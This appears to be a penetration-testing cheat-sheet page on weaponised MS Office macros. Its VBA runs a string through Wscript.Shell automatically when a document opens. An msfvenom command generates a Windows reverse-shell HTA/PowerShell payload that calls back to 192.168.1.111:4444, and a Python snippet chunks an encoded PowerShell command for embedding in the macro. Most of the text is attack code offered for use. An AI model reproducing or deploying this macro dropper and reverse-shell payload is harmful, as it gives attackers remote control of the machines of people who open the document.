# MS Office

### MS Word / Excel marco create micro

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
 Dim Str As String
{powershell payloads chopped}

 CreateObject("Wscript.Shell").Run Str
  
End Sub
```

{% hint style="info" %}
The macro needs to be in Project scope of the .doc
{% endhint %}

### Payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f
hta-psh -o evil.hta
#copy the powershell.exe -nop part

or

newpayloadgeneration.py
powershell -e ..
```

```
payload.py

str="powershell -e .."
n=50
for i in range(0,len(str),n):
    print("Str = str+" + '"' + str[i:i+n] +'"')


```

